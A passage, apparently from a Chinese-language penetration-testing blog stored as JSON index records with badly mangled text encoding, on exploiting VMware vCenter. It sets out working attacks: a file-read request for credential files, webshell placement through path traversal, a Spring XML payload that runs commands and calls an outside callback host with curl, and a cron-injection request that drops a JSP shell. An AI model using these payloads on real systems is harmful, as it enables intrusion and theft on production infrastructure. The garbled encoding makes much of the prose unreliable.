\u003csoap:Body\u003e \u003cRetrieveServiceContent xmlns=\"urn:internalvim25\"\u003e \u003c_this xsi:type=\"ManagedObjectReference\" type=\"ServiceInstance\"\u003eServiceInstance\u003c/_this\u003e \u003c/RetrieveServiceContent\u003e \u003c/soap:Body\u003e \u003c/soap:Envelope\u003e Nuclei ç›¸å…³æ¨¡æ¿ï¼š /nuclei-templates/technologies/vmware/vmware-detect.yaml ","date":"2022-05-05","objectID":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:2:1","tags":["æ¸—é€æµ‹è¯•"],"title":"vCenter æ¼æ´åˆ©ç”¨","uri":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.2 ä»»æ„æ–‡ä»¶è¯»å– å½±å“ç‰ˆæœ¬ï¼šVmware vCenter Server \u003c= 6.5.0 Fofa Dorkï¼štitle=\"ID_VC_Welcome\" VMware vCenter å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œå¯è¯»å– vCenter é…ç½®æ–‡ä»¶è·å¾—ç®¡ç†å¸å·å¯†ç è¿›è€Œæ§åˆ¶ vCenter å¹³å°åŠå…¶ç®¡ç†çš„è™šæ‹Ÿæœºé›†ç¾¤ã€‚ ç”±äº EAM ç”¨æˆ·è¿è¡Œè¯¥å­˜åœ¨æ¼æ´çš„æœåŠ¡ï¼ˆéåŸŸç”¨æˆ·ï¼‰ï¼Œå› æ­¤ä¸å­˜åœ¨ NTLM Relay ç­‰ä¸­ç»§æ”»å‡»é£é™©ã€‚ ç”±äºä¸åŒçš„ç³»ç»Ÿç‰ˆæœ¬ï¼Œæ•°æ®åº“é…ç½®æ–‡ä»¶ï¼ˆvcdb.propertiesï¼‰å­˜æ”¾ä½ç½®ä¸åŒï¼Œæ ¹æ®å®˜æ–¹æ–‡æ¡£ï¼Œå¤§ä½“å¯ä»¥åˆ†ä¸ºï¼š å¯¹äº vCenter Server 5.5 åŠæ›´ä½ç‰ˆæœ¬ï¼š Windows 2008 - C:\\ProgramData\\VMware\\VMware VirtualCenter å…¶ä»– Windows ç‰ˆæœ¬ - C:\\Documents and Settings\\All Users\\Application Data\\VMware\\VMware VirtualCenter\\ å¯¹äº vCenter Server 6.0ã€6.5ã€6.7ï¼š C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx POCï¼š GET /eam/vib?id={{path}}\\vcdb.properties HTTP/1.1 Host: {{Hostname}} nuclei ä¸­å¯¹åº”çš„ pocï¼š /nuclei-templates/vulnerabilities/vmware/vmware-vcenter-lfi.yaml /nuclei-templates/vulnerabilities/vmware/vmware-vcenter-lfi-linux.yaml ","date":"2022-05-05","objectID":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:2:2","tags":["æ¸—é€æµ‹è¯•"],"title":"vCenter æ¼æ´åˆ©ç”¨","uri":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.3 CVE-2021-21972 2.3.1 æ¼æ´åˆ©ç”¨ é»˜è®¤å¯ç”¨çš„ vROps æ’ä»¶ï¼ˆcom.vmware.vropspluginui.mvcï¼‰ServicesController ç±»çš„ uploadova æ¥å£å­˜åœ¨æœªæˆæƒè®¿é—®ï¼Œå¯åˆ©ç”¨è·¯å¾„ç©¿è¶Šå°†æ–‡ä»¶è§£å‹è‡³ç‰¹å®šç›®å½•å®ç° getshellã€‚ å½±å“ç‰ˆæœ¬ï¼š 7.0 \u003c= vCenter Server \u003c 7.0 U1c 6.7 \u003c= vCenter Server \u003c 6.7 U3l 6.5 1e \u003c= vCenter Server \u003c 6.5 U3n 4.x \u003c= Cloud Foundation (vCenter Server) \u003c 4.2 3.x \u003c= Cloud Foundation (vCenter Server) \u003c 3.10.1.2 POCï¼š /nuclei-templates/cves/2021/CVE-2021-21972.yaml EXPï¼š https://www.exploit-db.com/exploits/49602 2.3.2 æ¼æ´åˆ†æ å®šä½åˆ°å­˜åœ¨æ¼æ´çš„ Jar åŒ…ï¼š/etc/vmware/vsphere-ui/vc-packages/vsphere-client-serenity/com.vmware.vrops.install-6.x.x.xx000/plugins/vropsplugin-service.jar æ³¨æ„åˆ°ç¬¬ 463 è¡Œï¼Œç›´æ¥å°† TAR çš„æ–‡ä»¶åä¸ /tmp/unicorn_ova_dir æ‹¼æ¥å¹¶å†™å…¥æ–‡ä»¶ã€‚å¦‚æœæ–‡ä»¶åå†…å­˜åœ¨ ../ï¼Œå¯å°†æ–‡ä»¶è§£å‹è‡³ vsphere-ui ç”¨æˆ·æœ‰æƒé™çš„ç›®å½•ã€‚åˆ‡å…¥è¯¥ç”¨æˆ·å¹¶æŸ¥æ‰¾å¯å†™ç›®å½•ï¼š su vsphere-ui find / -writable -type d |\u0026 grep -v \"Permission denied\" å…¶ä¸­ .ssh ç›®å½•å¯å†™ï¼Œå› æ­¤ï¼Œæœ€ä¸ºå¸¸è§çš„æ€è·¯å°±æ˜¯å†™å…¥å…¬é’¥ï¼Œå¹¶åˆ©ç”¨è¯¥ç”¨æˆ·ç™»å½•ã€‚ä½†æ˜¯è¯¥æ–¹å¼å­˜åœ¨ä¸€å®šçš„å±€é™ï¼Œé¦–å…ˆçœ‹ä¸€ä¸‹ shadow æ–‡ä»¶ï¼š çœ‹åˆ°å¯†ç è¿‡æœŸæ—¶é—´ä¸º 90 å¤©ï¼Œå› æ­¤åœ¨å®‰è£… 90 å¤©åå³ä½¿å†™å…¥äº†å…¬é’¥ç™»å½•ä¹Ÿä¼šæç¤ºå¯†ç è¿‡æœŸï¼Œéœ€è¦æä¾›åŸå¯†ç å¹¶ä¿®æ”¹å¯†ç ã€‚æ­¤å¤–ï¼Œvsphere-ui ç”¨æˆ·çš„ç¬¬äºŒé¡¹ä¸º !ï¼Œè¿™è¡¨ç¤ºè¯¥ç”¨æˆ·æœªè®¾ç½®å¯†ç ï¼ˆä¸ç©ºå¯†ç ä¸åŒï¼‰ï¼Œæ‰€ä»¥ä¹Ÿå°±æ²¡æ³•ä¿®æ”¹å¯†ç ï¼Œå› æ­¤ï¼Œå½“å¯†é’¥è¿‡æœŸåï¼Œå°±æ— æ³•å†æ¬¡ç™»å½•ã€‚ å¦ä¸€ç§æ€è·¯å°±æ˜¯å†™å…¥ Webshellã€‚é¦–å…ˆéœ€è¦éå†æ‰¾å‡ºå­˜åœ¨æœ‰ jsp çš„ web.xml å¹¶ä¸”ç›®å½•å¯å†™ï¼š grep \"\u003cservlet-name\u003ejsp\u003c/servlet-name\u003e\" $(find / -name \"*web.xml\") æœ€ç»ˆç¡®å®šäº†å¦‚ä¸‹å‡ ä¸ª linux ä¸‹çš„å­˜æ”¾ä½ç½®ï¼š # vCenter 6.5/6.7 \u003c 13010631 /usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/%d/0/h5ngc.war/resources/\u003cthefile\u003e # vCenter 6.7 \u003e= 13010631 /usr/lib/vmware-vsphere-ui/server/static/resources/libs/\u003cthefile\u003e # vCenter 7.0ï¼Œå…¶ä¸­ resources15863815 åŠ¨æ€ç”Ÿæˆï¼Œå¯ä»¥é€šè¿‡è®¿é—® /ui å¯ä»¥è·å–è¯¥ç›®å½•ä¿¡æ¯ /usr/lib/vmware-vsphere-ui/server/static/resources15863815/libs/\u003cthefile\u003e ç”± /usr/lib/vmware-vsphere-ui/server/configuration/tomcat-server.xml æŸ¥åˆ°ç›‘å¬ç«¯å£ä¸º 5090ï¼Œå†ç”± rhttpproxy åå‘ä»£ç†æ‰¾åˆ° web è®¿é—®è·¯å¾„ï¼š æœ€åå°† webshell é‡Šæ”¾è‡³ /usr/lib/vmware-vsphere-ui/server/work/deployer/s/global/xx/0/h5ngc.war/resources/ ç›®å½•æˆ–å…¶å­ç›®å½•ï¼Œå³å¯è§£æå¹¶ç”± https://IP/ui/resources/webshell.jsp è®¿é—® è¯¥è·¯å¾„ä¸­çš„ xx å¹¶éæ˜¯å›ºå®šæ•°å€¼ï¼Œä¼šéšç€é‡è£…é‡å¯ç­‰è¡Œä¸ºå‘ç”Ÿæ”¹å˜ï¼Œæ‰€ä»¥æ„é€ ä¸Šä¼ åŒ…æ—¶å¯ä»¥æš´åŠ›æ‰¹é‡æ·»åŠ ï¼Œå¹¶æ¢æµ‹æ˜¯å¦ä¸Šä¼ æˆåŠŸã€‚ æ­¤å¤–ï¼Œ6.7U2 åŠä¹‹åçš„ç‰ˆæœ¬ï¼Œä¼šåœ¨æœåŠ¡å¯åŠ¨æ—¶åˆ¤æ–­å¦‚æœå­˜åœ¨ work ç›®å½•å°±åˆ é™¤ï¼Œä¹Ÿå°±æ˜¯è¯´ Web æ˜¯è·‘åœ¨å†…å­˜é‡Œé¢çš„ã€‚è¿™æ—¶å¯¹äº 6.7U2 åŠæ›´æ–°çš„ 6.7 ç‰ˆæœ¬å¯ä»¥å°† webshell é‡Šæ”¾è‡³ /usr/lib/vmware-vsphere-ui/server/static/resources/libs/ ç›®å½•ä½œä¸ºåé—¨ï¼Œå¾…å…¶é‡å¯åä¼šè¢«åŠ è½½è¿è¡Œã€‚å¯¹äº 7.0 ç‰ˆæœ¬ static åé¢çš„ resources ä¼šè·Ÿä¸€ä¸²åŠ¨æ€æ•°å­—è·¯å¾„ï¼Œèƒ½å¤Ÿåœ¨è¯·æ±‚çš„è¿”å›åŒ…ä¸­è·å–åˆ°ã€‚ é’ˆå¯¹ Windows ç‰ˆæœ¬ï¼Œå¯ä»¥åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šå†™å…¥ JSP webshell æ–‡ä»¶ï¼Œç”±äºæœåŠ¡æ˜¯ System æƒé™ï¼Œæ‰€ä»¥å¯ä»¥ä»»æ„æ–‡ä»¶å†™ã€‚å¸¸ç”¨çš„ç›®å½•ä¸ºï¼šC:\\ProgramData\\VMware\\vCenterServer\\data\\perfcharts\\tc-instance\\webapps\\statsreport\\ï¼Œè®¿é—® https://IP/statsreport/xxx.jsp å³å¯ã€‚ å…¶å®ƒå¸¸è§è·¯å¾„å¯ä»¥å‚è€ƒï¼švCenter2021å‡ ä¸ªæ¼æ´åŠåæ¸—é€ ","date":"2022-05-05","objectID":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:2:3","tags":["æ¸—é€æµ‹è¯•"],"title":"vCenter æ¼æ´åˆ©ç”¨","uri":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.4 CVE-2021-21985 2.4.1 æ¼æ´åˆ©ç”¨ é»˜è®¤å¯ç”¨çš„ Virtual SAN Health Check æ’ä»¶ï¼ˆvsan-h5-client.zipï¼‰/rest/* æ¥å£å­˜åœ¨æœªæˆæƒè®¿é—®ï¼Œå¯åˆ©ç”¨ä¸å®‰å…¨çš„åå°„è°ƒç”¨å®ç° RCEã€‚ å½±å“ç‰ˆæœ¬ï¼š 7.0 \u003c= vCenter Server \u003c 7.0 U2b 6.7 \u003c= vCenter Server \u003c 6.7 U3n 6.5 \u003c= vCenter Server \u003c 6.5 U3p 4.x \u003c= Cloud Foundation (vCenter Server) \u003c 4.2.1 3.x \u003c= Cloud Foundation (vCenter Server) \u003c 3.10.2.1 POCï¼š /nuclei-templates/cves/2021/CVE-2021-21985.yaml EXPï¼š https://github.com/r0ckysec/CVE-2021-21985 2.4.2 æ¼æ´åˆ†æ å‡ºç½‘åˆ©ç”¨ é¦–å…ˆå®šä½åˆ° vsan-h5-client æ’ä»¶å­˜æ”¾ä½ç½®ï¼šfind / -name '*vsan*' | grep 'h5'ï¼Œæœ€ç»ˆç¡®å®šåœ¨ /usr/lib/vmware-vpx/vsan-health/ui-plugins/vsan-h5-client.zip ç›®å½•ä¸‹ã€‚ ä¸‹è½½ï¼Œè§£å‹å¹¶åç¼–è¯‘å…¶ä¸­çš„ jar åŒ…ï¼Œç”±äºæ¼æ´æƒ…æŠ¥ä¸­æè¿°ä¸ºæœªæˆæƒè®¿é—®ï¼Œé¦–å…ˆåœ¨ h5-vsan-context.jar çš„ web.xml ä¸­å¯»æ‰¾ç›¸å…³çº¿ç´¢ï¼Œåœ¨å·²ç»ä¿®å¤çš„ç‰ˆæœ¬ä¸­ï¼Œå·²ç»æ·»åŠ äº†ç›¸åº”çš„ filterï¼š åœ¨ h5-vsan-service.jar ä¸­æ‰¾åˆ° com.vmware.vsan.client.services.AuthenticationFilterï¼Œå¦‚æœæœªè®¤è¯ï¼Œåˆ™ç›´æ¥è¿”å› 401ã€‚ å¦ä¸€å¤„å˜åŠ¨åœ¨ h5-vsan-service.jar ä¸­ ProxygenController ç±»çš„ invokeService æ–¹æ³•ï¼š æ·»åŠ äº†æ ¡éªŒï¼Œæ£€æµ‹åå°„è°ƒç”¨çš„æ–¹æ³•æ˜¯å¦ä¸ºå¸¦æœ‰ TsService æ³¨è§£ï¼Œå¯ç”¨äº†ç™½åå•æœºåˆ¶ã€‚å› æ­¤åŸºæœ¬å¯ä»¥ç¡®å®šæ¼æ´ç‚¹ä½äºè¯¥ç±»ä¸­ã€‚ TsService æ³¨è§£æºç ï¼š å‘ä¸Šå¯»æ‰¾åˆ°å®šä¹‰ @RequestMapping è·¯ç”±çš„ Controllerï¼Œå¯ä»¥çœ‹åˆ°åœ¨è¯·æ±‚è·¯å¾„ä¸­è·å– Bean åç§°æˆ–è€…ç±»åå’Œæ–¹æ³•åç§°ï¼Œæ¥ç€ä» POST æ•°æ®ä¸­è·å– methodInput åˆ—è¡¨ä½œä¸ºæ–¹æ³•å‚æ•°ï¼Œæ¥ç€è¿›å…¥ invokeService æ–¹æ³•ï¼š invokeServer å…ˆè·å–äº† Bean å®ä¾‹ï¼Œæ¥ç€è·å–è¯¥å®ä¾‹çš„æ–¹æ³•åˆ—è¡¨ï¼Œæ¯”å¯¹æ–¹æ³•åå’Œæ–¹æ³•å‚æ•°é•¿åº¦åï¼Œå°†ç”¨æˆ·ä¼ å…¥çš„å‚æ•°è¿›è¡Œäº†ä¸€ä¸ªç®€å•çš„ååºåˆ—åŒ–ååˆ©ç”¨è¿›è¡Œäº†è°ƒç”¨ã€‚ æ‰€ä»¥æ¥ä¸‹æ¥å°±æ˜¯åœ¨ Spring å·¥å‚åˆ›å»ºçš„ bean é‡ŒæŸ¥æ‰¾å±é™©æ–¹æ³•æ„å»ºåˆ©ç”¨é“¾äº†ï¼Œåœ¨ vsan-h5-client/plugins/h5-vsan-service/META-INF/spring/base/*.xml é…ç½®æ–‡ä»¶ä¸­æ‰¾åˆ° bean çš„å®šä¹‰ï¼Œæ‰€æœ‰ scope éƒ½æ˜¯ç¼ºçœçš„ singleton è€Œä¸”æ²¡æœ‰é…ç½® lazy-initï¼Œä¹Ÿå°±æ˜¯è¯´è¿™äº› bean éƒ½ä¼šåœ¨ spring é¡¹ç›®å¯åŠ¨æ—¶å•ä¾‹åŠ è½½ã€‚ æ¼æ´ä½œè€…æ‰€ä½¿ç”¨çš„ Bean æ˜¯ vmodlContextï¼Œå¯¹åº” jar ä¸º /etc/vmware/vsphere-ui/vc-packages/vsphere-client-serenity/com.vmware.vrops.install-6.x.x.xx000/plugins/vropsplugin-service.jarï¼Œç±»æ˜¯ com.vmware.vim.vmomi.core.types.impl.VmodContextImplï¼Œå…¶ä¸­çš„ loadVmodlPackage æ–¹æ³•ä»£ç å¦‚ä¸‹ï¼š å…¶ä¸­ä¼šé€šè¿‡ NonValidatingClassPathXmlApplicationContext åŠ è½½ contextPathï¼Œè€Œè¯¥ç±»ç»§æ‰¿è‡ªï¼šClassPathXmlApplicationContextï¼š å› æ­¤å¯ä»¥æ„é€ è¿œç¨‹åŠ è½½è§£æ xml ä¸­çš„ SpEL è¡¨è¾¾å¼è¿›è€Œæ‰§è¡Œå‘½ä»¤ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåœ¨ SpringContextLoader çš„ getContextFileNameForPackage ä¼šå°†è·¯å¾„ä¸­çš„ . æ›¿æ¢ä¸º /ï¼Œæ‰€ä»¥æ— æ³•æŒ‡å®šä¸€ä¸ªæ­£å¸¸çš„ IPv4 åœ°å€ï¼Œä½†æ˜¯å¯ä»¥åˆ©ç”¨æ•°å­—å‹ IP ç»•è¿‡ï¼š XML æ–‡ä»¶å†…å®¹åŠæ”»å‡»æ•ˆæœå¦‚ä¸‹ï¼š \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003cbeans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:context=\"http://www.springframework.org/schema/context\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd http://www.springframework.org/schema/context https://www.springframework.org/schema/context/spring-context.xsd\"\u003e \u003cbean id=\"pb\" class=\"java.lang.ProcessBuilder\"\u003e \u003cconstructor-arg\u003e \u003clist\u003e \u003cvalue\u003e/bin/bash\u003c/value\u003e \u003cvalue\u003e-c\u003c/value\u003e \u003cvalue\u003ecurl http://dj0esgxds3fv9m4a0a6dzorr0i69uy.oastify.com\u003c/value\u003e \u003c/list\u003e \u003c/constructor-arg\u003e \u003cproperty name=\"whatever\" value=\"#{pb.start()}\" /\u003e \u003c/bean\u003e \u003c/beans\u003e ä¸å‡ºç½‘åˆ©ç”¨ è‹¥è¦åˆ©ç”¨æ­¤æ¼æ´ï¼Œæœ¬è´¨ä¸Šéœ€è¦è·å–ä¸€ä¸ª XML æ–‡ä»¶çš„å†…å®¹ï¼Œè€Œ Java çš„ URL å¹¶ä¸æ”¯æŒ data åè®®ï¼Œé‚£ä¹ˆéœ€è¦è¿”å›å†…å®¹å¯æ§çš„ SSRF æˆ–è€…æ–‡ä»¶ä¸Šä¼ æ¼æ´ã€‚è¿™é‡Œåˆ©ç”¨çš„æ˜¯è¿”å›å†…å®¹å¯æ§çš„ SSRF æ¼æ´ã€‚æ¼æ´ä½äº /usr/lib/vmware-vpx/vsan-health/pyMoVsan/ ä¸‹çš„ vSAN Health ç»„ä»¶ä¸­ VsanHttpProvider.py å­˜åœ¨ä¸€ä¸ªæœªæˆæƒè®¿é—® SSRFã€‚ æ¼æ´ç‚¹æ˜¯ 238 è¡Œ urlopen åº“å‡½æ•°è¿›è¡Œ HTTP è¯·æ±‚ï¼Œæ¥ç€å°†è¿”å›å†…å®¹åœ¨å†…å­˜ä¸­è¿›è¡Œè§£å‹ï¼Œå¹¶ä¸”åŒ¹é…æ–‡ä»¶åä¸º .*offline_bundle.* çš„å†…å®¹å¹¶è¿›è¡Œè¿”å›ã€‚Python çš„ urlopen æ”¯æŒ data åè®®ï¼Œæ‰€ä»¥å¯ä»¥æ„é€ ä¸€ä¸ªå‹ç¼©åŒ…å¹¶ Base64 ç¼–ç ï¼Œæ„é€  data åè®®çš„ URLï¼š åœ¨åˆ©ç”¨çš„è¿‡ç¨‹ä¸­ï¼Œå°† IP åœ°å€æ›¿æ¢ä¸º localhost å³å¯é˜²æ­¢ . è¢«æ›¿æ¢ã€‚ç”±äºè¿™ä¸ªè·¯ç”±åœ¨ 6.5 ç‰ˆæœ¬çš„ vSAN Health ä¸å­˜åœ¨ï¼Œæ‰€ä»¥æ— æ³•åœ¨ 6.5 ç‰ˆæœ¬ä¸Šä¸å‡ºç½‘åˆ©ç”¨ã€‚ ç°åœ¨è™½ç„¶ä¸ç”¨è¿›è¡Œå¤–ç½‘è¯·æ±‚ï¼Œä½†æ˜¯ä»ç„¶æ— æ³•è·å–å‘½ä»¤å›æ˜¾ã€‚é€šè¿‡æŸ¥çœ‹ Bean åˆ—è¡¨ï¼Œå‘ç°å­˜åœ¨åä¸º systemProperties çš„ Beanã€‚åŒæ—¶è¿™ä¸ª Bean ä¹Ÿå­˜åœ¨æ–¹æ³•å¯ä»¥è·å–å±æ€§å†…å®¹ï¼š æ‰€ä»¥åœ¨æ‰§è¡Œ SpEL æ—¶ï¼Œå¯ä»¥å°†å‘½ä»¤æš‚å­˜åˆ° systemProperties ä¸­ï¼Œç„¶ååˆ©ç”¨ getProperty æ–¹æ³•è·å–å›æ˜¾ã€‚æœ€ç»ˆçš„ context.xml å†…å®¹ä¸ºï¼š \u003cbeans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\" http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"\u003e \u003cbean id=\"pb\" class=\"java.lang.ProcessBuilder\"\u003e \u003cconstructor-arg\u003e \u003clist\u003e \u003cvalue\u003e/bin/bash\u003c/value\u003e \u003cvalue\u003e-c\u003c/value\u003e \u003cvalue\u003e\u003c![CDATA[ ls -la / 2\u003e\u00261 ]]\u003e\u003c/value\u003e \u003c/list\u003e \u003c/constructor-arg\u003e \u003c/bean\u003e \u003cbean id=\"is\" class=\"java.io.InputStreamReader\"\u003e \u003cconstructor-arg\u003e \u003cvalue\u003e#{pb.start().getInputStream()}\u003c/value\u003e \u003c/constructor-arg\u003e \u003c/bean\u003e \u003cbean id=\"br\" class=\"java.io.BufferedReader\"\u003e \u003cconstructor-arg\u003e \u003cvalue\u003e#{is}\u003c/value\u003e \u003c/constructor-arg\u003e \u003c/bean\u003e \u003cbean id=\"collectors\" class=\"java.util.stream.Collectors\"\u003e\u003c/bean\u003e \u003cbean id=\"system\" clas","date":"2022-05-05","objectID":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:2:4","tags":["æ¸—é€æµ‹è¯•"],"title":"vCenter æ¼æ´åˆ©ç”¨","uri":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"},{"categories":["æ¸—é€æµ‹è¯•"],"content":"2.5 CVE-2021-22005 2.5.1 æ¼æ´åˆ©ç”¨ Analytics æœåŠ¡ç›¸å…³ç«¯ç‚¹å­˜åœ¨ç›®å½•ç©¿è¶Šå†™æ–‡ä»¶ï¼Œå¯ä»¥ç›´æ¥ä¸Šä¼  Webshell æ–‡ä»¶ï¼Œå¹¶è·å– root æƒé™ã€‚ å½±å“ç‰ˆæœ¬ï¼š 7.0 \u003c= vCenter Server \u003c 7.0 U2c 6.7 \u003c= vCenter Server \u003c 6.7 U3o POCï¼š /nuclei-templates/cves/2021/CVE-2021-22005.yaml EXPï¼š https://github.com/r0ckysec/CVE-2021-22005 https://github.com/shmilylty/cve-2021-22005-exp 2.5.2 æ¼æ´åˆ†æ ä¸¤ç§è§¦å‘æ–¹å¼ï¼Œä¸€ç§æ˜¯å¼€å¯ CEIP (Customer Experience Improvement Program) æ—¶ï¼Œé€šè¿‡ log4j è®°å½•æ—¥å¿—çš„åŠŸèƒ½å®ç°ä»»æ„æ–‡ä»¶å†™å…¥ï¼Œå¦ä¸€ç§æ˜¯é€šè¿‡ Velocity æ¨¡æ¿æ³¨å…¥æ‰§è¡Œä»£ç ã€‚è¿™ä¸ªæ¼æ´æ‹¿åˆ°çš„æƒé™æ˜¯ root æƒé™ã€‚ AsyncTelemetryController æ¼æ´ æ ¹æ®å®˜æ–¹çš„æ¼æ´é€šå‘Šå¯ä»¥å‘ç°ï¼Œå­˜åœ¨æ¼æ´çš„ API è·¯å¾„ä¸ºï¼š/analytics/telemetry/ph/api/hyper/sendã€‚è€Œå¯¹åº”è·¯å¾„çš„ rhttpproxy ç­–ç•¥åœ¨ vCenter å„ç‰ˆæœ¬ä¸­ä¹Ÿä¸å°½ç›¸åŒï¼Œæœ‰äº›ç‰ˆæœ¬åªæœ‰ /analytics/telemetry/ å¯ä»¥ç›´æ¥è®¿é—®ï¼Œæœ‰äº›ç‰ˆæœ¬åˆ™ /analytics/ ä¸‹å‡å¯è®¿é—®ï¼š æ ¹æ® poc æç¤ºæ¥å£ /analytics/telemetry/ph/api/hyper/sendï¼Œæ‰¾åˆ°å¯¹åº”çš„ç±»ï¼š analytics-push-telemetry-server-6.7.0.jar#com.vmware.ph.phservice.push.telemetry.server.AsyncTelemetryController.class å¯¹ /ph/api/hyper/send è·¯å¾„çš„ _vã€_cã€_i è¯·æ±‚å‚æ•°åˆ†åˆ«ç»‘å®šç»™å˜é‡ versionã€collectorIdã€collectorInstanceIdã€‚è·Ÿè¿› handleSendRequest å‡½æ•°ï¼Œæœ€ç»ˆå°†è°ƒç”¨ telemetryService.processTelemetry() æ–¹æ³•ï¼š ç»§ç»­è¿›å…¥ TelemetryService.processTelemetry()ï¼Œä¸Šé¢åˆšåˆšåˆ›å»ºçš„ TelemetryRequest å°†è¢«æäº¤åˆ°ä¸€ä¸ªé˜Ÿåˆ—å¹¶åœ¨ä¸ä¹…ä¹‹ååœ¨ TelemetryRequestProcessorRunnable å¤„æ‰§è¡Œï¼š TelemetryLevelBasedTelemetryServiceWrapper ç±» processTelemetry æ–¹æ³•ä¼šè°ƒç”¨ DefaultTelemetryLevelService ç±» getTelemetryLevel æ–¹æ³•è·å– telemetryLevelï¼š ç»§ç»­è·Ÿè¿›çœ‹åˆ°éœ€è¦ isCeipEnabled ä¸ä¸ºé»˜è®¤å€¼ false æ‰ä¼šç»§ç»­ï¼š éšåè°ƒç”¨ LogTelemetryService ç±» processTelemetry æ–¹æ³•ï¼Œåˆ©ç”¨ log4j å†™æ—¥å¿—æ–‡ä»¶è‡³ /var/log/vmware/analytics/prod/ ç›®å½•ï¼Œæ–‡ä»¶å†…å®¹ä¸º POST è¯·æ±‚ä½“æ•°æ®ï¼š æ—¥å¿—æ–‡ä»¶å­˜å‚¨åœ¨ /var/log/vmware/analytics/prod/_c\u003ccollector id\u003e_i\u003cinstance name\u003e.json å¹¶ä¸”å› ä¸º filename ä¸­åŒæ—¶åŒ…å« collectorId å’Œ collectorInstanceIdï¼Œæ‰€ä»¥å¯ä»¥åœ¨è·¯å¾„éå†ä¸­æ·»åŠ  ../ å­—ç¬¦ï¼Œåœ¨å¦ä¸€ä¸ªæ–‡ä»¶å¤¹ä¸­éšæ„åˆ›å»ºä¸€ä¸ªæ–‡ä»¶çš„æƒ…å†µã€‚ä½†æ˜¯ï¼Œåœ¨ Linux ç³»ç»Ÿä¸­ï¼Œå¦‚ä¸‹é¢çš„è·¯å¾„ä¸­å«æœ‰ä¸å­˜åœ¨çš„æ–‡ä»¶å¤¹ï¼Œåœ¨åˆ›å»ºæ–‡ä»¶æ—¶ä¼šæŠ¥é”™ï¼š /var/log/vmware/analytics/prod/_c_i/../../../../../../tmp/POC å¦‚ä½•è¿œç¨‹åˆ›å»ºè¯¥ä¸´æ—¶æ–‡ä»¶å†…ï¼Œç»è¿‡å¯ä»¥åœ¨ _i å‚æ•°å‰åŠ ä¸€ä¸ªæ–œæ ï¼Œç›®å½•ä¼šè¢«åˆ›å»ºã€‚ä¹‹åå°±å¯ä»¥é€šè¿‡ç›®å½•æ‹¼æ¥çš„å½¢å¼è¿›è¡Œæ–‡ä»¶å†™å…¥ã€‚ ç›®å‰å·²ç»å¯ä»¥æ§åˆ¶ä»»æ„æ–‡ä»¶å†™å…¥ï¼Œä½†æ˜¯æ²¡æœ‰åŠæ³•æ§åˆ¶æ–‡ä»¶åç¼€ .jsonï¼Œå¯¹äº linux çš„æœºå™¨å¯ä»¥å†™å…¥è®¡åˆ’ä»»åŠ¡æ¥æ‰§è¡Œå†™ shell çš„æ“ä½œï¼š POST /analytics/telemetry/ph-stg/api/hyper/send?_c=\u0026_i=/../../../../../../etc/cron.d/POC HTTP/1.1 Host: IP Content-Type: application/json Content-Length: 144 * * * * * root echo PCUgICAgICAgIG91dC5wcmludGxuKCJIZWxsb1dvcmxkIik7ICAgICAgJT4=|base64 -d \u003e/usr/lib/vmware-sso/vmware-sts/webapps/ROOT/hello.jsp å¾…å®šæ—¶ä»»åŠ¡å¯åŠ¨åï¼Œå¯åœ¨ https://localhost/idm/..;/hello.jsp å¯ä»¥è®¿é—®åˆ° shellã€‚ (è¿™é‡Œçš„/..;/æ˜¯å› ä¸ºTomcatä¼šå°†/..;/è§†ä½œ/../ï¼Œå¯ä»¥åˆ©ç”¨è¯¥ç‰¹æ€§ç»•è¿‡ vCenter æŸäº›ç‰ˆæœ¬çš„ rhttpproxy çš„è®¿é—®é™åˆ¶)ã€‚ DataAppAgentController æ¼æ´ å®˜æ–¹æä¾›çš„ POC ä¸­è¿˜æ¶‰åŠåˆ°ä¸€ä¸ªæ¥å£ï¼š/analytics/telemetry/ph/api/dataapp/agentï¼Œè€Œåœ¨æ–°ç‰ˆæœ¬çš„ä»£ç ä¸­ï¼Œå·²ç»å°†ç«¯ç‚¹ï¼š /dataapp/agent ç›¸å…³ä»£ç å…¨éƒ¨åˆ é™¤ï¼Œå› æ­¤ç¡®å®šæ¼æ´çš„ä½ç½®ã€‚ æœ€ç»ˆé€šè¿‡VelocityHelper.executeVelocityExpression è§¦å‘ velocity è¡¨è¾¾å¼æ‰§è¡Œã€‚ æœ€ç»ˆ @testbnull å‘ç°å¯ä»¥é€šè¿‡ä¸Šä¸‹æ–‡å¯ç”¨çš„ $GLOBAL-loggerï¼Œåˆ©ç”¨ setFile æ–¹æ³•ä¸´æ—¶ä¿®æ”¹æ—¥å¿—è·¯å¾„åˆ° Web è·¯å¾„çš„æ–¹å¼ï¼Œå†™å…¥ WebShell å®ç° RCEã€‚ ","date":"2022-05-05","objectID":"/2022/05/vcenter%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/:2:5","tags":["æ¸—é€æµ‹è¯•"],"title":"vCenter 